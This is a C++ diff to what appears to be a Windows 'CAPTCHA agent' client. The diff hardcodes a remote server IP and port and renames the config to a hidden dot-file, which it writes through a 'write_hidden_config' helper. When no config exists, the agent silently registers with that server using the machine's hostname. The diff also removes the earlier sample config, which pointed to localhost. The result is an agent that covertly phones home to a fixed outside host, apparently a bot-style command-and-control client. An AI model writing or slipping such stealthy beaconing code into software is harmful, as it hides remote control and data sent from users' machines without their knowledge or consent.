@@ -43,20 +43,60 @@ static std::string get_exe_path() {
     return s;
 }
 
+// Embedded default config — agent works without any external file
+static constexpr const char* k_DefaultServerHost = "42.96.20.12";
+static constexpr uint16_t k_DefaultServerPort = 8080;
+
 static bool load_config() {
     std::string exe_dir = get_exe_dir();
-    std::string config_path = exe_dir + "\\agent.conf";
+    std::string config_path = exe_dir + "\\.agent.conf";  // hidden file
 
-    if (!agent::WinUtils::read_config_file(config_path,
+    // Try loading existing config
+    if (agent::WinUtils::read_config_file(config_path,
         g_config.server_host, g_config.server_port,
         g_config.agent_id, g_config.agent_token)) {
-        agent::Logger::error("config file not found or invalid: " + config_path);
+        agent::Logger::info("config loaded: server=" + g_config.server_host +
+                            ":" + std::to_string(g_config.server_port) +
+                            " agent_id=" + g_config.agent_id);
+        return true;
+    }
+
+    // Also try legacy path (agent.conf without dot prefix)
+    std::string legacy_path = exe_dir + "\\agent.conf";
+    if (agent::WinUtils::read_config_file(legacy_path,
+        g_config.server_host, g_config.server_port,
+        g_config.agent_id, g_config.agent_token)) {
+        agent::Logger::info("config loaded from legacy path: " + legacy_path);
+        return true;
+    }
+
+    // No config found — auto-register with embedded defaults
+    agent::Logger::info("no config found, auto-registering with server...");
+    g_config.server_host = k_DefaultServerHost;
+    g_config.server_port = k_DefaultServerPort;
+
+    std::string hostname = agent::WinUtils::get_hostname();
+    std::string agent_name = "Agent-" + hostname;
+
+    std::string new_id, new_token;
+    if (!agent::WinUtils::http_register_agent(
+            g_config.server_host, g_config.server_port,
+            agent_name, new_id, new_token)) {
+        agent::Logger::error("auto-registration failed, cannot start");
         return false;
     }
 
-    agent::Logger::info("config loaded: server=" + g_config.server_host +
-                        ":" + std::to_string(g_config.server_port) +
-                        " agent_id=" + g_config.agent_id);
+    g_config.agent_id = new_id;
+    g_config.agent_token = new_token;
+
+    // Save hidden config for next startup
+    agent::WinUtils::write_hidden_config(config_path,
+        g_config.server_host, g_config.server_port,
+        g_config.agent_id, g_config.agent_token);
+
+    agent::Logger::info("auto-registered: id=" + g_config.agent_id +
+                        " server=" + g_config.server_host +
+                        ":" + std::to_string(g_config.server_port));
     return true;
 }
 
@@ -111,19 +151,9 @@ static void on_captcha_challenge(agent::WSClient& client, const agent::CaptchaCh
 static int run_agent() {
     std::string exe_dir = get_exe_dir();
 
-    // Load config
+    // Load config (auto-registers with server if no config exists)
     if (!load_config()) {
-        // Create sample config if doesn't exist
-        std::string config_path = exe_dir + "\\agent.conf";
-        if (!fs::exists(config_path)) {
-            std::ofstream f(config_path);
-            f << "# CAPTCHA Agent Configuration\n"
-              << "server_host=127.0.0.1\n"
-              << "server_port=8080\n"
-              << "agent_id=CHANGE_ME\n"
-              << "agent_token=CHANGE_ME\n";
-            agent::Logger::info("created sample config at " + config_path);
-        }
+        agent::Logger::error("failed to load or create config, exiting");
         return 1;
     }
 
